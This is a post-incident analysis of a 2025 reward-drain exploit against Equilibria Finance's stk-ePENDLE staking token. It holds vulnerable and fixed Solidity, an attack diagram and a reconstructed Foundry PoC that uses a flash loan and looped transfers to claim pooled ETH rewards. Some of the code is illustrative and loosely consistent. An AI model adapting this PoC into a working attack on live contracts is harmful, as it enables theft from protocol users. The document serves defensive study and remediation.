# Equilibria Finance Security Incident Analysis
**Business Logic Vulnerability | Ethereum | 2025-08-23 | Loss: ~$68,000 (approx. 13.36 ETH)**

---

## 1. Incident Overview

| Item | Details |
|------|------|
| Project | Equilibria Finance |
| Chain | Ethereum Mainnet |
| Date | 2025-08-23 (recorded as 2025-08-24 per SlowMist) |
| Loss | ~$68,000 (approx. 13.36 ETH) |
| Vulnerability Type | Business Logic — design flaw allowing stk-ePENDLE transferability |
| Attack Transaction | On-chain verification required ([Etherscan](https://etherscan.io/tx/)) |
| Attacker Address | On-chain verification required ([Etherscan](https://etherscan.io/address/)) |
| Vulnerable Contract (ePENDLE) | [`0x22Fc5A29...fCe4455`](https://etherscan.io/address/0x22Fc5A29bd3d6CCe19a06f844019fd506fCe4455) |
| Related Protocols | Equilibria Finance, Pendle Finance, Balancer |
| Root Cause Summary | The stk-ePENDLE contract on Ethereum mainnet lacked the non-transferable configuration present on other chains, allowing the attacker to acquire ePENDLE via flash loan, repeatedly transfer stk-ePENDLE to trigger reward claims on each transfer, and drain all accumulated rewards |
| Official Announcement | [Equilibria Twitter/X](https://x.com/Equilibriafi/status/1959296722930483668) |

---

## 2. Vulnerability Details

### 2.1 stk-ePENDLE Transfer Permission Design Flaw (Core Vulnerability)

**Severity**: HIGH  
**CWE**: CWE-284 (Improper Access Control) / CWE-670 (Always-Incorrect Control Flow Implementation)

#### Background: Equilibria Finance Architecture

Equilibria Finance is a yield optimization protocol built on top of Pendle Finance.

- **PENDLE** → deposited by users to mint **ePENDLE** 1:1 (tokenized locked vePENDLE position)
- **ePENDLE** → staked to mint **stk-ePENDLE** (staking receipt token)
- **stk-ePENDLE holders** → receive ETH fee rewards, PENDLE rewards, and EQB emissions
- **Reward claim trigger**: accumulated rewards are automatically settled on any change in stk-ePENDLE balance (including transfers)

#### Vulnerability Description

The stk-ePENDLE contract on other chains (e.g., Arbitrum) was correctly configured as non-transferable. However, the **Ethereum mainnet version** was deployed without the same security setting.

Core flaw in the reward distribution logic:
1. Every `transfer()` of stk-ePENDLE **automatically claims any pending rewards for that address**
2. Reward checkpoints are updated for both sender and receiver
3. The attacker acquired a large amount of ePENDLE via flash loan, converted it to stk-ePENDLE, then repeatedly transferred it between multiple attacker-controlled addresses — collecting the contract's accumulated rewards on every transfer
4. These ETH rewards were undistributed vePENDLE fees accumulated by Equilibria for over a year

#### Vulnerable Code (❌)

```solidity
// ❌ Vulnerable code: Ethereum mainnet stk-ePENDLE contract
// Transfer restriction (non-transferable) logic is missing

contract StkEPendle is ERC20, RewardDistributor {
    
    // ❌ Standard ERC20 transfer — reward checkpoint auto-updated on transfer
    // Unlike other chains, the Ethereum mainnet version has no transfer() restriction
    function transfer(address to, uint256 amount) 
        public 
        override 
        returns (bool) 
    {
        // Before transfer: sender's accumulated rewards are automatically claimed
        _checkpointAndClaim(msg.sender);
        // After transfer: receiver's checkpoint is updated
        _checkpointAndClaim(to);
        
        return super.transfer(to, amount);
        // ❌ No non-transferable restriction — external transfers are freely allowed
        // ❌ Attacker can collect all accumulated contract rewards on each transfer
    }
    
    function transferFrom(address from, address to, uint256 amount) 
        public 
        override 
        returns (bool) 
    {
        // Reward checkpoints updated for both addresses before and after transfer
        _checkpointAndClaim(from);
        _checkpointAndClaim(to);
        
        return super.transferFrom(from, to, amount);
        // ❌ Also allows abnormal external transfers
    }
    
    // Reward checkpoint and auto-claim logic
    function _checkpointAndClaim(address user) internal {
        uint256 pendingReward = _calculatePending(user);
        if (pendingReward > 0) {
            // Immediately transfer accumulated ETH rewards to user
            _transferReward(user, pendingReward);
        }
        userRewardPerTokenPaid[user] = rewardPerTokenStored;
    }
}
```

#### Fixed Code (✅)

```solidity
// ✅ Fixed code: non-transferable restriction added
// Applies the correct implementation from other chains to Ethereum as well

contract StkEPendle is ERC20, RewardDistributor {
    
    // ✅ Enforced non-transferable: external transfers completely blocked
    // Same as the correct implementation on Arbitrum and other chains
    function transfer(address, uint256) 
        public 
        pure 
        override 
        returns (bool) 
    {
        // stk-ePENDLE is non-transferable — for staking position tracking only
        revert("stk-ePENDLE: transfers are not allowed");
    }
    
    function transferFrom(address, address, uint256) 
        public 
        pure 
        override 
        returns (bool) 
    {
        // transferFrom is also completely blocked
        revert("stk-ePENDLE: transfers are not allowed");
    }
    
    // ✅ Reward claims only possible via dedicated function (on stake/unstake)
    function claimRewards() external {
        _checkpointAndClaim(msg.sender);
    }
    
    function _checkpointAndClaim(address user) internal {
        uint256 pendingReward = _calculatePending(user);
        if (pendingReward > 0) {
            _transferReward(user, pendingReward);
        }
        userRewardPerTokenPaid[user] = rewardPerTokenStored;
    }
}
```

---

### 2.2 Reward Drain via Repeated Multi-Address Transfers (Attack Technique)

**Severity**: HIGH  
**CWE**: CWE-682 (Incorrect Calculation) — unintended exploitation of reward distribution logic

#### Vulnerability Description

In a structure where the reward distribution logic calculates pending rewards based on the current stk-ePENDLE balance, the attacker collected the contract's entire accumulated rewards multiple times by **repeatedly transferring a large balance**.

#### Vulnerable Code (❌)

```solidity
// ❌ Vulnerable reward calculation logic
// rewardPerToken is based on total contract accumulated rewards

mapping(address => uint256) public userRewardPerTokenPaid;
mapping(address => uint256) public rewards;
uint256 public rewardPerTokenStored;

function rewardPerToken() public view returns (uint256) {
    if (totalSupply() == 0) return rewardPerTokenStored;
    // Total accumulated ETH rewards / total staked token supply
    return rewardPerTokenStored + 
        (pendingRewards * 1e18 / totalSupply());
}

function earned(address account) public view returns (uint256) {
    // ❌ Problem: larger balance allows claiming more rewards at once
    // ❌ Acquiring a large balance via flash loan and transferring monopolizes all rewards
    return (balanceOf(account) * 
        (rewardPerToken() - userRewardPerTokenPaid[account])) / 1e18 
        + rewards[account];
}

// ❌ _beforeTokenTransfer hook unconditionally updates rewards on every transfer
function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
) internal override {
    if (from != address(0)) {
        rewards[from] = earned(from);
        userRewardPerTokenPaid[from] = rewardPerTokenStored;
    }
    if (to != address(0)) {
        rewards[to] = earned(to);
        userRewardPerTokenPaid[to] = rewardPerTokenStored;
    }
    // ❌ Because transfer() is possible, this hook can be abused
}
```

#### Fixed Code (✅)

```solidity
// ✅ Making stk-ePENDLE non-transferable means _beforeTokenTransfer is only
// called on mint/burn, completely eliminating the attack vector

function _beforeTokenTransfer(
    address from,
    address to,
    uint256 amount
) internal override {
    // ✅ Reward checkpoint updates only on mint/burn (normal behavior)
    // Since transfer() reverts, the case where from != address(0) && to != address(0) is impossible
    if (from != address(0)) {
        rewards[from] = earned(from);
        userRewardPerTokenPaid[from] = rewardPerTokenStored;
    }
    if (to != address(0)) {
        rewards[to] = earned(to);
        userRewardPerTokenPaid[to] = rewardPerTokenStored;
    }
}
```

---

## 3. Attack Flow

```
+═══════════════════════════════════════════════════════════════════+
║           Equilibria Finance Attack Flow (2025-08-23)            ║
+═══════════════════════════════════════════════════════════════════+

   Attacker EOA
       │
       │ [Step 1] Request Balancer flash loan
       ▼
+──────────────────────+
│   Balancer Vault     │──────── Provides large PENDLE flash loan
│  (Flash loan provider)│
+──────────────────────+
       │
       │ Receives large PENDLE
       ▼
+──────────────────────+
│   Equilibria         │
│   ePENDLE Contract   │──── [Step 2] PENDLE → ePENDLE 1:1 swap
│  0x22Fc5A29...       │         (or direct ePENDLE purchase on market)
+──────────────────────+
       │
       │ ePENDLE acquired
       ▼
+──────────────────────+
│   Equilibria         │
│   stk-ePENDLE        │──── [Step 3] ePENDLE → stk-ePENDLE staking
│   Contract           │         (large stake → large stk-ePENDLE acquired)
│  (Vulnerable contract)│
+──────────────────────+
       │
       │ stk-ePENDLE acquired (Attacker Address A)
       ▼
+═══════════════════════════════════════════════════════════+
║              [Step 4] Repeated Transfer Attack Loop        ║
+═══════════════════════════════════════════════════════════+
│                                                           │
│  Attacker Address A ──transfer()──▶ Attacker Address B   │
│       │                              │                    │
│  Reward claimed (ETH received)  Reward claimed (ETH received) │
│                                      │                    │
│  Attacker Address B ──transfer()──▶ Attacker Address C   │
│       │                              │                    │
│  Reward claimed (ETH received)  Reward claimed (ETH received) │
│                                      │                    │
│  Attacker Address C ──transfer()──▶ Attacker Address A   │
│  Reward claimed (ETH received)                            │
│                              ↑ Repeat (N times) ↓        │
│  ※ Contract's accumulated ETH rewards collected on every transfer │
│  ※ Over 1 year of accumulated rewards fully drained in just a few transfers │
+═══════════════════════════════════════════════════════════+
       │
       │ Total ~13.36 ETH rewards stolen
       ▼
+──────────────────────+
│   Attacker           │──── [Step 5] Unstake (stk-ePENDLE → ePENDLE)
│                      │
│                      │──── [Step 6] ePENDLE → PENDLE conversion or market sell
+──────────────────────+
       │
       │
       ▼
+──────────────────────+
│   Balancer Vault     │──── [Step 7] Repay flash loan principal + fee
+──────────────────────+
       │
       │ Final profit: ~13.36 ETH (~$68,000) retained
       ▼
   Attacker profit confirmed

※ Automatic pause: immediately after the first attack transaction,
   Equilibria's automated monitoring system (Hypernative) detected it
   and triggered a full protocol pause.
   As a result, core user funds — Pendle Market LP positions,
   ePENDLE balances, etc. — were not affected.
```

**Step-by-step description**:

1. **Flash loan execution**: The attacker borrowed a large amount of PENDLE tokens from Balancer Vault via uncollateralized flash loan (or directly purchased ePENDLE on the market)

2. **ePENDLE acquisition**: Deposited the borrowed PENDLE into Equilibria's ePENDLE contract to receive ePENDLE tokens at a 1:1 ratio. ePENDLE is Equilibria's tokenization of the vePENDLE position

3. **stk-ePENDLE staking**: Staked the acquired ePENDLE into the stk-ePENDLE contract to obtain a large amount of stk-ePENDLE. At this point the attacker held a very large share of the total staking pool

4. **Reward drain via repeated transfers**: Exploited the fact that stk-ePENDLE's `transfer()` function auto-updates the reward checkpoint on transfer. By repeatedly transferring between multiple attacker-controlled addresses, the attacker claimed the contract's accumulated ETH rewards (vePENDLE fees built up over more than a year) on every single transfer

5. **Asset recovery and repayment**: After collecting rewards, unstaked stk-ePENDLE and repaid the flash loan principal and fee to Balancer

6. **Profit confirmed**: Net profit of approximately 13.36 ETH (~$68,000)

**Protocol automated response**: Equilibria's on-chain monitoring system (Hypernative) detected the first attack transaction and automatically paused all protocol functionality. Thanks to this, core user funds — Pendle Market LP positions, ePENDLE balances, etc. — were not affected.

---

## 4. PoC Code Analysis

No dedicated Equilibria PoC exists in the DeFiHackLabs repository; the following is a reconstructed PoC analysis based on the publicly disclosed attack mechanism:

```solidity
// PoC: Equilibria Finance stk-ePENDLE Reward Drain Attack Reproduction
// Reference: https://x.com/Equilibriafi/status/1959296722930483668
// WARNING: For educational purposes only. Do not exploit in production.

pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Equilibria interface definitions
interface IEquilibriaEPendle {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IStkEPendle {
    function stake(uint256 amount) external;
    function unstake(uint256 amount) external;
    // ❌ Vulnerable: transfer triggers reward claim
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function earned(address account) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract EquilibriaAttack is Test {
    // ─── Contract Addresses (Ethereum Mainnet) ───
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant PENDLE_TOKEN   = 0x808507121B80c02388fAd14726482e061B8da827;
    address constant EPENDLE_TOKEN  = 0x22Fc5A29bd3d6CCe19a06f844019fd506fCe4455;
    address constant STK_EPENDLE    = address(0); // Actual address to be confirmed on Etherscan
    
    // Auxiliary addresses controlled by the attacker (for reward draining)
    address immutable ADDR_B;
    address immutable ADDR_C;
    
    IERC20 pendle     = IERC20(PENDLE_TOKEN);
    IERC20 ependle    = IERC20(EPENDLE_TOKEN);
    IStkEPendle stkEP = IStkEPendle(STK_EPENDLE);
    
    constructor() {
        // Create auxiliary addresses (in practice, pre-deployed helper contracts)
        ADDR_B = makeAddr("attacker_B");
        ADDR_C = makeAddr("attacker_C");
    }

    // ─── Main Attack Entry Point ───
    function attack() external {
        // [Step 1] Borrow large PENDLE via Balancer flash loan
        address[] memory tokens = new address[](1);
        tokens[0] = PENDLE_TOKEN;
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 100_000 ether; // Request large PENDLE flash loan
        
        console.log("[1] Flash loan request: %d PENDLE", amounts[0]);
        IBalancerVault(BALANCER_VAULT).flashLoan(
            address(this), 
            tokens, 
            amounts, 
            ""
        );
        
        // [Final] Check net profit
        console.log("[Final] Attacker ETH balance: %d wei", address(this).balance);
    }

    // ─── Balancer Flash Loan Callback ───
    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "Unauthorized caller");
        
        uint256 borrowedAmount = amounts[0];
        console.log("[2] Flash loan received: %d PENDLE", borrowedAmount);
        
        // [Step 2] Swap PENDLE → ePENDLE (1:1)
        pendle.approve(EPENDLE_TOKEN, borrowedAmount);
        IEquilibriaEPendle(EPENDLE_TOKEN).deposit(borrowedAmount);
        
        uint256 ependleBalance = ependle.balanceOf(address(this));
        console.log("[3] ePENDLE acquired: %d", ependleBalance);
        
        // [Step 3] Stake ePENDLE → stk-ePENDLE
        ependle.approve(STK_EPENDLE, ependleBalance);
        stkEP.stake(ependleBalance);
        
        uint256 stkBalance = stkEP.balanceOf(address(this));
        console.log("[4] stk-ePENDLE staking complete: %d", stkBalance);
        
        // Check expected rewards before attack
        uint256 initialReward = stkEP.earned(address(this));
        console.log("[4] Current pending rewards: %d ETH wei", initialReward);
        
        // [Step 4] Execute reward drain via repeated transfers
        _drainRewards(stkBalance);
        
        // [Step 5] Unstake stk-ePENDLE
        stkEP.unstake(stkEP.balanceOf(address(this)));
        
        // [Step 6] Process ePENDLE (market sell or PENDLE conversion after unstaking)
        // ... (in the actual attack, handled via DEX)
        
        // [Step 7] Repay flash loan principal + fee
        uint256 repayAmount = borrowedAmount + feeAmounts[0];
        pendle.transfer(BALANCER_VAULT, repayAmount);
        
        console.log("[7] Flash loan repaid: %d PENDLE", repayAmount);
    }
    
    // ─── Core Reward Drain Logic ───
    function _drainRewards(uint256 stkBalance) internal {
        uint256 ethBefore = address(this).balance;
        
        // Collect rewards on every transfer by repeatedly sending between multiple addresses
        // ❌ Calling transfer() fires _beforeTokenTransfer hook,
        //    immediately settling accumulated rewards for both addresses
        for (uint256 i = 0; i < 10; i++) {
            // A → B transfer: collect A's rewards
            stkEP.transfer(ADDR_B, stkBalance);
            console.log("  [Loop %d] ETH balance after A→B transfer: %d", i, address(this).balance);
            
            // B → A transfer: collect B's rewards (requires separate helper contract)
            // In the actual attack, multiple helper contracts were used
            vm.prank(ADDR_B);
            stkEP.transfer(address(this), stkBalance);
        }
        
        uint256 ethDrained = address(this).balance - ethBefore;
        console.log("[Drain complete] ETH rewards collected: %d wei", ethDrained);
    }
    
    // Fallback to receive ETH
    receive() external payable {}
}

// ─── Fork Test Runner ───
contract EquilibriaAttackTest is Test {
    EquilibriaAttack attacker;
    
    function setUp() public {
        // Fork Ethereum Mainnet (at the attack block)
        vm.createSelectFork("mainnet");
        attacker = new EquilibriaAttack();
    }
    
    function testExploit() public {
        uint256 ethBefore = address(attacker).balance;
        attacker.attack();
        uint256 ethAfter = address(attacker).balance;
        
        console.log("=== Attack Result ===");
        console.log("ETH gained: %d wei (%d ETH)", 
            ethAfter - ethBefore,
            (ethAfter - ethBefore) / 1e18
        );
        
        // Verify expected profit: ~13.36 ETH
        assertGt(ethAfter - ethBefore, 13 ether, "Attack profit less than expected");
    }
}
```

**PoC Key Analysis**:

| Step | Function Call | Purpose | Fund Flow |
|------|---------|------|---------|
| 1 | `Balancer.flashLoan()` | Borrow large PENDLE uncollateralized | PENDLE → Attacker |
| 2 | `ePENDLE.deposit()` | Swap PENDLE → ePENDLE | PENDLE → ePENDLE (1:1) |
| 3 | `stkEPendle.stake()` | ePENDLE → stk-ePENDLE | ePENDLE → stk-ePENDLE |
| 4 | `stkEPendle.transfer()` × N | Reward drain (core vulnerability exploitation) | Contract accumulated ETH → Attacker |
| 5 | `stkEPendle.unstake()` | Recover stk-ePENDLE | stk-ePENDLE → ePENDLE |
| 6 | DEX swap | Liquidate ePENDLE | ePENDLE → PENDLE |
| 7 | `Balancer.repay()` | Repay flash loan | PENDLE → Balancer |

---

## 5. CWE Classification

| CWE ID | Vulnerability Name | Affected Component | Severity |
|--------|---------|-------------|--------|
| CWE-284 | Improper Access Control | stk-ePENDLE transfer() function | HIGH |
| CWE-670 | Always-Incorrect Control Flow Implementation | Ethereum mainnet missing non-transferable setting | HIGH |
| CWE-682 | Incorrect Calculation | Auto-claim on transfer in reward distribution logic | HIGH |
| CWE-1068 | Inconsistency Between Implementation and Documented Design | Implementation mismatch between other chains and Ethereum mainnet | MEDIUM |
| CWE-693 | Protection Mechanism Failure | First attack transaction not prevented before automated pause | MEDIUM |

### V-01: stk-ePENDLE Transfer Permitted — Cross-Chain Implementation Inconsistency
- **Description**: The stk-ePENDLE contract on other chains such as Arbitrum was correctly configured as non-transferable, but the Ethereum mainnet version lacked the same restriction, allowing the standard ERC20 `transfer()` function to be called freely
- **Impact**: The attacker was able to acquire a large amount of stk-ePENDLE via flash loan, then repeatedly transfer it between attacker-controlled addresses to drain all accumulated ETH rewards (approx. 13.36 ETH, ~$68,000) built up in the contract over more than a year
- **Attack Prerequisites**: Access to Balancer flash loan, control of multiple EOAs or contract addresses, sufficient gas limit to execute within a single block

### V-02: Automatic Reward Claim Trigger — Transfer Event Hook Abuse
- **Description**: The stk-ePENDLE `_beforeTokenTransfer` hook contained logic to automatically settle accumulated rewards for both addresses on transfer, but this was designed under the assumption that stk tokens are non-transferable
- **Impact**: On Ethereum mainnet where the non-transferable restriction was absent, this hook became the attack vector. The attacker drained rewards at an exponentially accelerated rate by cycling through transfer → reward collection → transfer → reward collection
- **Attack Prerequisites**: stk-ePENDLE transfer() enabled + undistributed accumulated rewards present in the contract

### V-03: Absence of Per-Chain Deployment Verification Process
- **Description**: When deploying the same protocol to a new chain, no standardized checklist or automated verification existed to confirm that chain-specific settings were correctly applied
- **Impact**: The Ethereum mainnet version operated for over a year with security settings missing compared to other chains
- **Attack Prerequisites**: A misconfigured contract holding real user funds

---

## 6. Reproducibility Assessment

| Item | Assessment | Notes |
|------|------|------|
| Attack Difficulty | **Low** | Executable with flash loan + repeated ERC20 transfers only |
| Special Tools Required | None | Only standard DeFi tools (Balancer flash loan) used |
| Upfront Capital Required | Very low | Major capital sourced via flash loan |
| MEV/Sandwich Resistance | N/A | Atomic single-transaction attack |
| Detectability | **Post-hoc detection** | Monitoring system detected after first tx (after attack completed) |
| Patch Complexity | **Very low** | Solvable by adding a single revert line to transfer() |
| Reproducibility After Patch | **Impossible** | Attack vector completely eliminated after non-transferable setting applied |

**Overall Assessment**: The attack technique itself is simple (flash loan + repeated transfers), but the root cause is a structural flaw in multi-chain deployment management. This type of vulnerability is especially likely to occur when the same protocol is deployed across multiple chains and is difficult to detect without a system to track and manage per-chain configuration differences.

---

## 7. Remediation

### Immediate Actions

**1) Immediately block stk-ePENDLE transfer() (Emergency Patch)**

```solidity
// ✅ Emergency patch applicable immediately — attack vector completely eliminated in 2 lines

contract StkEPendle is ERC20 {
    
    // Override ERC20 transfer() → unconditional revert
    function transfer(address, uint256) 
        public 
        pure 
        override 
        returns (bool) 
    {
        revert StkEPendle__TransferNotAllowed();
    }
    
    // Override ERC20 transferFrom() → unconditional revert  
    function transferFrom(address, address, uint256) 
        public 
        pure 
        override 
        returns (bool) 
    {
        revert StkEPendle__TransferNotAllowed();
    }
    
    // approve is also meaningless so block it
    function approve(address, uint256) 
        public 
        pure 
        override 
        returns (bool) 
    {
        revert StkEPendle__ApprovalNotAllowed();
    }
    
    error StkEPendle__TransferNotAllowed();
    error StkEPendle__ApprovalNotAllowed();
}
```

**2) Immediately distribute or isolate existing accumulated rewards**

```solidity
// ✅ Snapshot-based distribution for recovering existing user rewards after patch
// Utilizes stk-ePENDLE holdings snapshot prior to the attack block

contract RewardRecovery {
    mapping(address => uint256) public snapshotBalance;
    uint256 public attackBlock;
    
    function distributeRecoveredRewards(
        address[] calldata victims,
        uint256[] calldata snapshotBalances
    ) external onlyOwner {
        // Redistribute rewards drained by the attack to legitimate holders
        // Actual payment handled via direct ETH transfer from Equilibria Treasury
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 share = snapshotBalances[i] * recoveredAmount / totalSnapshot;
            payable(victims[i]).transfer(share);
        }
    }
}
```

**3) Maintain protocol pause and notify users**

- Maintain full pause on all functionality (automatically triggered immediately after the attack)
- Confirm ePENDLE and Pendle Market normal operation before sequential resumption
- Identify affected users and publicly announce Treasury compensation plan

---

### Long-Term Improvements

**1) Introduce standardized multi-chain deployment process**

| Item | Current State | Recommended Action |
|------|---------|---------|
| Per-chain configuration management | Manual verification | Mandatory automated configuration checklist |
| Pre-deployment verification | Insufficient | Run identical security test suite for all chain deployments |
| Contract diff tracking | None | Automatically generate per-chain contract configuration diff report |
| Cross-chain audit | None | Perform dedicated security audit for each new chain deployment |

**2) Automated invariant verification**

```solidity
// ✅ Invariant tests: automatically run after every chain deployment

contract StkEPendleInvariantTest is Test {
    IStkEPendle stkEP;
    
    function setUp() public {
        // Run tests against per-chain deployment address
        stkEP = IStkEPendle(STK_EPENDLE_ADDR);
    }
    
    // Invariant 1: transfer() must always revert
    function invariant_transferAlwaysReverts() public {
        address alice = makeAddr("alice");
        address bob   = makeAddr("bob");
        
        vm.prank(alice);
        vm.expectRevert();
        stkEP.transfer(bob, 1); // Must revert
    }
    
    // Invariant 2: approve() must always revert
    function invariant_approveAlwaysReverts() public {
        vm.expectRevert();
        stkEP.approve(makeAddr("spender"), 1);
    }
    
    // Invariant 3: stk-ePENDLE balance changes only via stake/unstake
    function invariant_balanceChangesOnlyViaStakeUnstake() public {
        // balanceOf must not change by any means other than stake/unstake
        uint256 balBefore = stkEP.balanceOf(address(this));
        // Even if transfer is attempted, balance must remain unchanged
        try stkEP.transfer(makeAddr("x"), 1) {} catch {}
        assertEq(stkEP.balanceOf(address(this)), balBefore);
    }
}
```

**3) Monitoring and circuit breaker improvements**

```solidity
// ✅ Reward drain detection circuit breaker

contract RewardDistributorWithCircuitBreaker {
    uint256 public maxRewardPerBlock;    // Maximum reward threshold per block
    uint256 public lastBlockRewards;
    uint256 public lastCheckBlock;
    
    modifier rewardCircuitBreaker(uint256 amount) {
        if (block.number > lastCheckBlock) {
            lastBlockRewards = 0;
            lastCheckBlock = block.number;
        }
        lastBlockRewards += amount;
        
        // Detect abnormally high reward claims within a single block
        require(
            lastBlockRewards <= maxRewardPerBlock,
            "RewardCircuitBreaker: per-block reward limit exceeded — abnormal pattern detected"
        );
        _;
    }
    
    function _transferReward(address user, uint256 amount) 
        internal 
        rewardCircuitBreaker(amount) 
    {
        payable(user).transfer(amount);
        emit RewardClaimed(user, amount);
    }
}
```

**4) Cross-chain security configuration audit (structural improvement)**

- Conduct quarterly cross-chain security status reviews
- Version-control per-chain contract configurations using GitOps methodology
- Run identical vulnerability scans against the same contract on all chains
- When adding new features, either deploy simultaneously to all chains or publish a clear deployment roadmap

---

## 8. Lessons Learned

### Configuration Inconsistency Risk in Multi-Chain Protocols

1. **"Safe on other chains" ≠ "Safe on Ethereum"**: The core of this incident was not a security vulnerability but a **deployment configuration inconsistency**. The stk-ePENDLE that was correctly set as non-transferable on Arbitrum was not on Ethereum mainnet. Teams operating multi-chain protocols must periodically verify that each chain's deployment configuration satisfies identical security standards.

2. **Transferability of staking receipt tokens must be reviewed**: A token representing a staking position — like stk-ePENDLE — can be used to exploit the reward system if it is transferable. Staking position tokens must be non-transferable by design, and this must be explicitly enforced via ERC20 inheritance and override.

3. **Dangerous combination of reward checkpoint logic and transfer hooks**: The pattern of automatically settling rewards in `_beforeTokenTransfer` or `_afterTokenTransfer` becomes an attack surface when combined with the standard ERC20 `transfer()`. This logic must be explicitly restricted to only execute within staking/unstaking functions.

4. **Flash loans eliminate the barrier to entry, not the vulnerability itself**: In this attack, the flash loan was not the vulnerability. The attacker used a flash loan to temporarily acquire a large staking position without initial capital. All staking logic should be reviewed for whether large-scale staking position manipulation via flash loan is possible.

5. **Long-accumulated unclaimed rewards are a prime attack target**: Funds that have accumulated in a contract over a long period are always a primary target for attackers. It is recommended to introduce a periodic distribution mechanism to prevent large-scale accumulation of unclaimed rewards, or to set accumulation limits.

6. **Effectiveness and limitations of automated monitoring**: Equilibria's automated monitoring system (Hypernative) immediately paused the protocol after the first attack transaction, preventing further damage. However, since the first transaction could not be prevented, both proactive detection (mempool monitoring for attack transactions) and reactive response are necessary.

7. **Protection of core funds was successful**: This incident succeeded in limiting damage to ~$68,000. Core user funds — Pendle Market LP positions, ePENDLE balances, etc. — remained safe. This is because Equilibria applied multi-layered protections to critical assets, and serves as a good precedent from a business continuity perspective.

### Comparison with Similar Incidents

| Protocol | Date | Loss | Vulnerability Type | Common Factor |
|---------|------|------|-----------|--------|
| Penpie | 2024-09-03 | $27M | Reentrancy + reward inflation | Pendle ecosystem, reward mechanism abuse |
| Level Finance | 2023-05-01 | $1.1M | Repeated reward claiming | Reward drain, repeated calls |
| Equilibria | 2025-08-23 | ~$68K | Transfer enabled + reward drain | Staking token transfer + auto reward claim |

Both Penpie and Equilibria are built on the Pendle ecosystem, and both were cases where design flaws in the reward mechanism became the attack vector. Both protocols suffered reward drain attacks combined with flash loans, but the root cause of the Equilibria incident was a simpler configuration error than Penpie.

### Developer Checklist

- [ ] Explicitly set staking receipt tokens (xToken, stkToken, etc.) as non-transferable
- [ ] Review whether auto-claim reward hooks are connected to transfer events
- [ ] Apply identical security tests to all chain deployments of the same protocol
- [ ] Simulate large-scale staking position manipulation via flash loan
- [ ] Set accumulation limits for contract rewards or implement periodic automatic distribution
- [ ] Adopt GitOps to track security configuration differences across cross-chain deployments
- [ ] Build a dual defense layer with on-chain monitoring + mempool monitoring

---

*This document was prepared based on publicly available information (Equilibria official announcement, SlowMist database, on-chain data). As no official PoC for this incident exists in the DeFiHackLabs repository, this analysis includes a reconstruction based on public information.*

*References:*
- *[Equilibria Official Security Update](https://x.com/Equilibriafi/status/1959296722930483668)*
- *[SlowMist Hacked Database](https://hacked.slowmist.io/?c=ETH)*
- *[Equilibria Finance Documentation](https://docs.equilibria.fi)*